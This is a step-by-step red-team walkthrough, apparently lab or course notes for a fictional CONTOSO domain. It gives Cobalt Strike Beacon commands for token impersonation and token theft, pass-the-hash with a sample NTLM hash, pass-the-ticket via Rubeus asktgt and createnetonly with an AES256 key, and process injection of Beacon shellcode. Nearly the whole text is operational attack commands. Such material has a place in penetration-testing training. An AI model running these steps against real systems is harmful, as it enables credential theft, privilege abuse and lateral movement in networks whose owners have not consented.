# Kill Chain

## Token Impersonation <a href="#token-impersonation" id="token-impersonation"></a>

### Make Token <a href="#make-token" id="make-token"></a>

1. From the medium-integrity Beacon, create and impersonate an access token for rsteel.
   1. `make_token CONTOSO\rsteel Passw0rd!`
2. Drop the impersonation.
   1. `rev2self`

### Steal Token <a href="#steal-token" id="steal-token"></a>

1. From the high-integrity Beacon, open the Process Browser.
   1. `process_browser`
2. Select a process owned by rsteel.
3. Steal the primary access token of that process and add it to the token store.
   1. Click **Steal Token**.
   2. Mask Type: `TOKEN_ALL_ACCESS`
   3. Store: true
4. Impersonate that token.
   1. Run token-store use 0 from the Beacon console.
5. Drop the impersonation.
   1. `rev2self`
6. Remove the token from the store.
   1. `token-store remove 0`

&#x20;

## Pass the Hash <a href="#pass-the-hash" id="pass-the-hash"></a>

1. From the high-integrity Beacon, perform a PtH attack for Robert Steel.
   1. `pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889`
2. Drop the impersonation.
   1. `rev2self`&#x20;

## Pass the Ticket <a href="#pass-the-ticket" id="pass-the-ticket"></a>

1.  Using their AES256 key, request a TGT for rsteel from the medium-integrity Beacon.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
    ```
2.  From the high-integrity Beacon, inject and impersonate the ticket.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass /ticket:[TGT]
    ```

    1. `steal_token [PID]`
3. Drop the impersonation.
   1. rev2self
   2. kill \[PID]

## Process Injection <a href="#process-injection" id="process-injection"></a>

1. From the high-integrity Beacon, open the Process Browser.
   1. `process_browser`
2. Select a process owned by rsteel.
3. Inject Beacon shellcode into that process.
   1. Click **Inject**.
   2. Select the tcp-local listener.
